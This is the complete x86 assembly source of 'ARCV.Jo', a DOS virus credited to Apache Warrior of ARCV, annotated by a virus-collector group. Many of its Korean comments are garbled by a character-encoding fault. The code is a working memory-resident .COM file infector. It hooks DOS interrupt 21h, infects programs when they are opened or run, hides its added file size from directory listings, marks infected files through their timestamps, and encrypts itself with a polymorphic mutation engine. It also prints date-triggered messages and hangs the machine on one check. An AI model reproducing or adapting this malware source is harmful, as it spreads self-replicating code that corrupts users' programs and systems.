;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                       ARCV.Jo                               CVC #01   97/06
;                       -------
;
; ·¡Ÿq : ARCV.Jo
; ¹A¸b¸a : Apache Warrior, µwŠ‚
; ¦…¬â : Osiris of CVC,Corea 97/06
; ¹·ŸA : Resident .COM Encryption  Stealth
;
; This is Yet another virus from the ARCV, this one is called
; Joanna, it was written by Apache Warrior, ARCV President.
;
; It has Stealth features, it is a Resident infector of .COM files
; and uses the Cybertech Mutation Engine (TM) by Apache Warrior for 
; its Polymorphic features.  There is a maximum of 3 unchanged bytes
; in the Encrypted code.
;
; ‰Áˆá µwŠ‚· ¤a·¡œá¯a ‹až“·¥ ARCV µA¬á ¹A¸bÐe ¤a·¡œá¯a·¡”a.
; ARCV · ¡Q¤á“e –¡w·¥•A µwŠ‚ ‰wÀiµA ÁAÍ¡ –A´ö”a.
;
; ‹a—i· ¤a·¡œá¯a“e ‹aœý‰A šá´áa»¡ ´g”a‰¡ Ðe”a.
;
; ´a®á¶…ˆå Ã¡¡w¸â·¥ µAœá (Int 24h) Ÿi ÀáŸ¡ Ða»¡ ´g·e ˆõ·¡”a.
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
.model tiny

code segment

                ASSUME CS:CODE,DS:CODE,ES:CODE

int_21ofs       equ 84h                         ;
int_21seg       equ 86h                         ;
length          equ offset handle-offset main   ; ‹©·¡
msglen          equ offset oldstart-offset msg  ; ¡A¯¡»¡ ‹©·¡
tsrlen          equ (offset findat-offset main)/10 ; œ‘¬wº Ça‹¡
len             equ offset handle-offset main   ;
virlen          equ (offset string-offset main2)/2
decryptlen      equ offset main2-offset main    ; ´qÑ¡‹©·¡

                org 100h  

start:          jmp main
                db 0,0,0

main:           mov si,offset main2             ; ´qÑ¡Ð¹AŸi ¶áÐe SI ˆt
                mov cx,virlen                   ; ´qÑ¡ÑÁ–E Ça‹¡
loop_1:         
                db 2eh,81h,2ch                  ; ´qÑ¡Î‰‹¡
switch:         dw 0
                add si,02h
                dec cx
                jnz loop_1

;
main2:          call findoff                    ; •IÈaµ¡Ïa­UŠÐa‹¡
findoff:        pop si                          ; 
                sub si,offset findoff           ;
                push ds
                push es
                push cs                         ; cs=ds
                pop ds
                push cs                         ; cs=es
                pop es
                mov ax,0ff05h                   ; Scythe2 Boot ˆñ¬a
                int 13h
                cmp ah,0e9h                     ;
                jnz haha                        ;
                mov ah,09h                      ; ¹¥¸Ða¡e ¡A¯¡»¡ Â‰b
                lea dx,[si+offset msg2]         ; Ða‰¡ ¯¡¯aÉQ ¸÷»¡
                int 21h                         ;
                jmp $                           ; (¢Ðe žÏa)

haha:           mov ah,2ah                      ; ¯¡¯aÉQ i¼a ŠÐa‹¡
                int 21h                         ;
                cmp dx,1210h                    ; 10 ¶©”i·¥ˆa ?
                jnz main3                       ;
                mov ah,09h                      ; ¡A¯¡»¡ Â‰b
                lea dx,[si+offset msg] 
                int 21h

main3:          mov di,0100h                    ; ¶¥œ Ïa¡‹aœ‘· ´|¦¦… ¥¢Š
                push si                         ; 5 ¤a·¡Ëa
                mov ax,offset oldstart          ;
                add si,ax                       ;
                mov cx,05h                      ;
                cld                             ;
                repz movsb                      ;

inst:           mov ax,0ffa4h                   ; ·¡£¡ ‹¡´â¸w­¡µA ¬wºÐ ·¶“eˆa ?
                int 21h
                pop si                          ; SI
                cmp ax,42a1h
                je oldprog                      ; ·¡£¡ ¬wºÐ ·¶·a¡e ¸¯©Ð—

tt2:            xor ax,ax                       ; œ‘ ¬wº žË¥
                push ax
                mov ax,ds                       ; MBC ­A‹a åËa º­¡ ´è‹¡
                dec ax                          ; PSP - 1 = MCB
                mov es,ax                       ; ES = MCB º­¡
                pop ds                          ; 
                mov ax,word ptr ds:int_21ofs    ; Int 21h º­¡ˆt ´è‹¡
                mov cx,word ptr ds:int_21seg    ;
                mov word ptr cs:[si+int21],ax   ; Int 21h º­¡ˆt ¸á¸w
                mov word ptr cs:[si+int21+2],cx ;
                cmp byte ptr es:[0],5ah         ; ¯¡¸b–A“e MCB ·¥ˆa ?
                jne oldprog                     ; ·¡‰w¶ •¡¯aÀwµA¬á“e ¸b•·´eÐq
                mov ax,es:[3]                   ;
                sub ax,0bch                     ; 3008 ¤a·¡Ëa¥¡”a ¸b·eˆa ?
                jb  oldprog                     ;
                mov es:[3],ax                   ;
                sub word ptr es:[12h],0bch      ;
                mov es,es:[12h]                 ;
                push ds                         ;
                push cs                         ;
                pop ds                          ; ¤a·¡œá¯a ¥¢¬a
                mov di,0100h                    ;
                mov cx,len+5                    ;
                push si                         ;
                add si,0100h                    ;
                rep movsb                       ;
                pop si
                pop ds
                cli                             ;
                mov ax,offset new21             ; Int 21h ¤aŽ‹¡
                mov word ptr ds:int_21ofs,ax    ;
                mov word ptr ds:int_21seg,es    ;
                sti                             ;

oldprog:        
                mov di,0100h                    ; »¥¼a COM · ´|¦¦… ¥¢Š
                pop es                          ;
                pop ds                          ;
                push di                         ;
                ret                             ;

int21           dd 0h                           ; Int 21h · º­¡ˆt

;
;   New interupt 21h Handler
;

sayitis:        mov ax,42a1h                    ; ‹¡´â¸w­¡µA ¬wºÐ·¶”a
                iret 

new21:          ;nop                            ; Sign byte 
                cmp ax,0ffa4h                   ; œ‘¬wº ˆñ¬a ?
                je sayitis
                cmp ah,11h                      ; FCB Search file
                je adjust_FCB
                cmp ah,12h                      ; FCB Search Again
                je adjust_FCB
                cmp ah,4eh                      ; Handle Search file
                je adjust_FCB    
                cmp ah,4fh                      ; Handle Search Again
                je adjust_FCB
                cmp ah,3dh                      ; Ìa·© µ¡Ïe
                je intgo                        ;
                cmp ah,4bh                      ; Ìa·© ¯©Ð—
                jne noint 
intgo:          push ax                         ; 4bh, 3dh Infect file
                push bx                         ; A»¡¯aÈá—i ¸á¸w
                push cx
                push es
                push si
                push di
                push dx
                push ds
                call checkit                    ; ˆqµq žË¥ Ñ¡Â‰
                pop ds
                pop dx
                pop di
                pop si
                pop es
                pop cx
                pop bx
                pop ax
noint:          jmp cs:[int21]                  ; ¶¥œ· Int 21h ¡

adjust_FCB:     push es                         ; ¯aÉI¯a žË¥
                push bx
                push si
                push ax
                xor si,si
                and ah,40h                      ; 4Eh,4Fh Àx‹¡ ·¥ˆa ?
                jz okFCB
                mov si,1                        ; Set flag
okFCB:          mov ah,2fh                      ; DTA º­¡ ´è‹¡
                int 21h 
                pop ax                          ; »¥¼a Ì÷­e (11h,12h,4Eh,4Fh)
                call i21                        ; ¯©Ð—
                pushf                           ; flag ¸á¸w
                push ax                         ; AX µAœá Å¡—a ¸á¸w
                call adjust                     ; ¯aÉI¯a žË¥ Ñ¡Â‰
                pop ax                          ; A»¡¯aÈá ¥¢Š
                popf
                pop si
                pop bx
                pop es
                retf 2                          ; Ÿ¡Èå

adjust:         pushf                           ; ¯aÉI¯a žË¥ ÁAÇa
                cmp si,0                        ; 11h,12h ·¥ˆa ?
                je fcb1
                popf
                jc repurn                       ; µAœá·¥ˆa ?
                mov ah,byte ptr es:[bx+16h]     ;
                and ah,01ah                     ; ˆqµq –A´öa ?
                cmp ah,01ah                     ;
                jne repurn                      ; 
                sub word ptr es:[bx+1ah],len    ; Ìa·© ‹©·¡ - ¤a·¡œá¯a ‹©·¡
; COM Ìa·©·¡‹¡ ˜¢…µA 64 KB Ÿi ñ»¡ ´g·a£a¡ SBB Ÿi ³a»¡ ´g´v”a.
; EXE Ìa·©· ‰w¶ SBB Ÿi ¬a¶wÐ´¡ Ðe”a.
repurn:         ret                             ; from file size.

fcb1:           popf                            ; FCB Ÿi ¶áÐe žË¥
                cmp al,0ffh                     ; µAœá ?
                je meat_hook   
                cmp byte ptr es:[bx],0ffh       ; ÑÂ¸w FCB ·¥ˆa ?
                jne xx2
                add bx,7                        ; + 7
xx2:            mov ah,byte ptr es:[bx+17h]     ; ˆqµq µa¦ ˆñ¬a
                and ah,01ah
                cmp ah,01ah
                jne meat_hook
                sub word ptr es:[bx+1dh],len    ;
meat_hook:      ret  

com_txt db 'COM',0                              ; ÑÂ¸w¸a

reset:                                          ; Ìa·© ­¢¬÷ žË¥
                mov cx,20h                      ; Ìa·©·i ·ª‹¡ / ³a‹¡¡
set_back:                                       ; ¤aŽ‘
                mov al,01h
find_att:
                mov ah,43h                      ; Ìa·© ­¢¬÷
i21:            pushf
                call cs:[int21]
exitsub:        ret   

checkit:                                        ; Infect routine
                push es                         ; ”á  g·e A»¡¯aÈá—i ¸á¸w
                push ds
                push ds                         ; ÑÂ¸w¸aˆa COM ·¥»¡ ˆñ¬a
                pop es                          ;
                push dx                         ;
                pop di                          ;
                mov cx,0ffh                     ; . Àx‹¡
                mov al,'.'                      ;
                repnz scasb                     ;
                push cs                         ; cs=ds
                pop ds                          ;
                mov si,offset com_txt           ; COM ·¥ˆa ?
                mov cx,3                        ;
                rep cmpsb                       ;
                pop ds                          ;
                pop es                          ;
                jnz exitsub                     ;

foundtype:      sub di,06h                      ; commaND.com ·¥»¡ ˆñ¬a
                cmp ds:[di],'DN'                ;
                je exitsub                      ;
                mov word ptr cs:[nameptr],dx    ; DS:DX ¸á¸w
                mov word ptr cs:[nameptr+2],ds  ;
                mov al,00h                      ; Ìa·©· ­¢¬÷ ´è‹¡
                call find_att                   ;
                jc exitsub                      ; µAœá ?

alteratr:       mov cs:[attrib],cx              ; ­¢¬÷ ¸á¸w
                call reset                      ; ·ª‹¡/³a‹¡¡ ¤aŽ‘

                mov ax,3d02h                    ; µ¡Ïe
                call i21        
                jc exitsub                      ; µAœá ?
                push cs                         ;
                pop ds                          ; CS=DS
                mov ds:[handle],ax              ; Ìa·© Ð…—i ¸á¸w

                mov ax,5700h                    ; Ìa·©· ¸b¬÷·©/¯¡ˆe ´è‹¡
                mov bx,ds:[handle]              ;
                call i21                        ;
ke9:            mov ds:[date],dx                ; i¼a ¸á¸w
                or cx,1ah                       ; ˆqµq –E ˆõ·a¡ ÀáŸ¡
                mov ds:[time],cx                ; ¯¡ˆe ¸á¸w
                                                  
                mov ah,3fh                      ; ´|· 5 ¤a·¡Ëa ·ª‹¡
                mov cx,05h                      ;
                mov dx,offset oldstart          ;
                call i21                        ;
closeit:        jc close2                       ; µAœá ?

                mov ax,4202h                    ; Ìa·© {µA¬á -5 ¤a·¡Ëa –A“e
                mov cx,0ffffh                   ; ¶áÃ¡¡ ·¡•·
                mov dx,0fffbh                   ;
                call i21                        ;
                jc close                        ; µAœá ?

                mov word ptr cs:si_val,ax       ; Ìa·© ¬a·¡»a ¸á¸w
                cmp ax,0ea60h                   ; EA60h ¥¡”a Çeˆa ?
                jae close                       ;

                mov ah,3fh                      ; 5 ¤a·¡Ëa ·ª‹¡
                mov cx,05h                      ; 
                mov dx,offset tempmem           ; 
                call i21                        ; 
                jc close                        ;

                push cs                         ; cs=es
                pop es                          ;
                mov di,offset tempmem           ; ˆqµq µa¦ ÑÂ·¥
                mov si,offset string            ;
                mov cx,5                        ;
                rep cmpsb                       ;
                jz close                        ;
                                                 
zapfile:                                        ;
                mov ax,word ptr cs:si_val       ; 
                add ax,2                        ;
                push cs                         ; 
                pop ds                          ; 
                mov word ptr ds:[jpover+1],ax   ; ¬¡¶… ¸ñÏa ¶áÃ¡ ¬é¸÷
                call mut_eng                    ; Call Mutation Engine
                mov ah,40h                      ; ³a‹¡
                mov bx,cs:[handle]              ; Handle
                mov cx,length                   ; LENGTH OF PROGRAM****
                call i21                        ; ³a‹¡ ®Ð—!
close2:         jc close                        ; Quit if error

                push cs                         ; Reset DS to CS
                pop ds                          ;      
                mov ax,4200h                    ; Í¡·¥ÈáŸi Àá·q·a¡ ·¡•·
                xor cx,cx                       ;
                cwd                             ; Clever way to XOR DX,DX
                call i21                        ;
                jc close                        ; Error Quit..
                                                 
                mov ah,40h                      ; Save new start 
                mov cx,03h                      ; 
                mov dx,offset jpover            ;
                call i21                        ;

close:          mov ax,5701h                    ; Time & Date ¥¢Š
                mov bx,ds:[handle]              ;
                mov cx,ds:[time]                ;
                mov dx,ds:[date]                ;
                call i21                        ;
                mov ah,3eh                      ; Ìa·© ”h‹¡
                call i21                        ;
exit_sub:       mov dx,word ptr [nameptr]       ; ­¢¬÷ ¥¢Š
                mov cx,ds:[attrib]              ;
                mov ds,word ptr cs:[nameptr+2]  ;
                call set_back                   ;
                ret                             ; Return to INT 21h Handler


;******************************************************************************
;               CyberTech Mutation Engine 
;
;               This is Version Two of the Mutation Engine 
;               Unlike others it is very much Virus Specific..  Works
;               Best on Resident Viruses..
;
;               To Call
;
;               si_val = File Size
;
;               Returns
;               DS:DX = Encrypted Virus Code, Use DS:DX pointer to
;                       Write From..
;
;******************************************************************************


mut_eng:
                mov ah,2ch                      ; Get Time
                call i21                        ;
                mov word ptr ds:[switch],dx     ; Use Sec./100th counter as key
                mov word ptr ds:[switch2+1],dx  ; Save to Decrypt and Encrypt
                mov ax,cs:[si_val]              ; Ìa·© Ça‹¡ ´è‹¡
                mov dx,offset main2             ;
                add ax,dx                       ;
                mov word ptr [main+1],ax        ; Decrypt offset ¥¢Š
                xor byte ptr [loop_1+2],28h     ; Add/Sub ¥eÑÅ
                xor byte ptr switch2,28h        ;    "
                push cs                         ; CS=DS
                pop ds                          ;
                push cs                         ; CS=AX
                pop ax                          ;
                sub ax,0bch                     ;
                mov es,ax                       ; µa¦…· ­A‹a åËa ŠÐa‹¡
                mov si,offset main              ; ´qÑ¡žË¥ ¥¢¬a
                mov di,0100h                    ;
                mov cx,decryptlen               ;
                rep movsb                       ;
                mov si,offset main2             ; Å¡—a ´qÑ¡ÑÁ ¯¡¸b
                mov cx,virlen                   ;
loop_10:        lodsw                           ;
switch2:        add ax,0000                     ; ´qÑ¡ÑÁ
                stosw                           ;
                loop loop_10                    ;
                mov si,offset string            ; ˆqµq ID ¸á¸w
                mov cx,5                        ;
                rep movsb                       ;
                mov dx,0100h                    ;
                push es                         ;
                pop ds                          ;
                ret                             ;

; Data Section, contains Messages etc.


;               Little message to the Wife to Be..

msg             db 'Looking Good Slimline Joanna.',0dh,0ah
                db 'Made in England by Apache Warrior, ARCV Pres.',0dh,0ah,0ah 
                db 'Jo Ver. 1.11 (c) Apache Warrior 92.',0dh,0ah
                db '$'

msg2            db 'I Love You Joanna, Apache..',0dh,0ah,'$'

virus_name      db '[JO]',00h                           ; Virus Name..
author          db 'By Apache Warrior, ARCV Pres.'      ; Thats me..
filler          dd 0h

oldstart:       mov ax,4c00h                    ; Orginal program start
                int 21h
                nop
                nop

j100h           dd 0100h                        ; Stores for jumps etc
jpover          db 0e9h,00,00h                  ;

string          db '65fd3'                      ; ID String 

heap:                                           ; This code is not saved
handle          dw 0h                           ; Ìa·© Ð…—i
nameptr         dd 0h                           ;
attrib          dw 0h                           ; ­¢¬÷
date            dw 0h                           ; i¼a
time            dw 0h                           ; ¯¡ˆe
tempmem         db 10h dup (?)                  ;
findat          db 0h                           ;
si_val          dw 0h                           ;

code ends

end start
